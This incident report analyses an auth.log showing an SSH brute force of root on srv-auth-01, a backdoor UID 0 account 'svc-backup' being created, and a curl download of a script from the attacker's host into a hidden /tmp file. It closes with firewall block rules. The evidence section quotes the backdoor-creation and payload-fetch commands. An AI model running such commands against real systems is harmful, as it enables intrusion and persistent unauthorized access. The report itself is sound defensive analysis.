# Incident Report: Unauthorized Access and Compromise on srv-auth-01

## Executive Summary
An analysis of `auth.log` revealed a severe security breach on `srv-auth-01`. An external attacker originating from IP `198.51.100.77` successfully brute-forced SSH credentials for the `root` account, established persistent backdoor access by creating a privileged user with UID 0, and downloaded an arbitrary script payload to `/tmp/.x`.

---

## Severity
- **CRITICAL**

---

## Evidence
- **Brute-Force & Successful Login:** 
  - Multiple failed login attempts followed by: `Accepted password for root from 198.51.100.77 port 41031 ssh2`
- **Privilege Escalation & Persistence:** 
  - `useradd[7120]: new user: name=svc-backup, UID=0, GID=0, home=/root, shell=/bin/bash`
- **Payload Retrieval:** 
  - `sudo: root : TTY=pts/3 ; PWD=/root ; USER=root ; COMMAND=/usr/bin/curl -s http://198.51.100.77/x.sh -o /tmp/.x`

---

## Attacker Information
- **Attacker IP:** `198.51.100.77`

---

## Post-Exploitation Activities
1. **Brute-Force Authentication:** Systematic password attacks against the `root` user until access was granted.
2. **Backdoor Account Creation:** Created a fake service account (`svc-backup`) with root-level privileges (UID/GID 0) and root home directory.
3. **Payload Download:** Fetched an external shell script (`x.sh`) from the attacker's server and saved it to `/tmp/.x` for execution.

---

## Recommended Containment & Remediation (Firewall Commands)
To block the attacker IP immediately:

```bash
# Using iptables
iptables -A INPUT -s 198.51.100.77 -j DROP

# Using UFW
ufw deny from 198.51.100.77 to any
```
